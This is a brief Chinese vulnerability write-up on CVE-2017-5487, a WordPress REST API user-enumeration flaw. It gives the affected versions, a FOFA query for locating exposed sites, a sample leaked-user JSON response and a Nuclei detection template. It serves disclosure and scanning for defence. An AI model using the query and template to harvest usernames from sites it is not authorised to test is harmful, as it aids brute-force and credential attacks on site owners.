## WordPress REST API User Enumeration 用户名枚举漏洞分析（CVE-2017-5487）

## 影响版本
```
WordPress Core < 4.7.1
```

## FOFA
```
body="wp-json/wp/v2/users/"
```

## POC 
```json
//直接访问wp-json/wp/v2/users/以后会返回JSON格式的数据：
[{"id":1,"name":"admin","url":"","description":"","link":"https:\/\/www.xxxx.com\/archives\/author\/admin","slug":"admin","meta":[],"_links":{"self":[{"href":"https:\/\/www.xxxx.com\/wp-json\/wp\/v2\/users\/1"}],"collection":[{"href":"https:\/\/www.xxxx.com\/wp-json\/wp\/v2\/users"}]}}]
```


## Nuclei
```
id: wordpress-user-enumeration

info:
  name: WordPress REST API User Enumeration
  author: beichu
  severity: medium
  description: |
    Detects WordPress user enumeration via REST API
  tags: wordpress,wp,info-leak,user-enum

requests:
  - method: GET
    path:
      - "{{BaseURL}}/wp-json/wp/v2/users/"

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        part: header
        words:
          - "application/json"

      - type: regex
        part: body
        regex:
          - '"name"\s*:\s*"[^"]+"'

```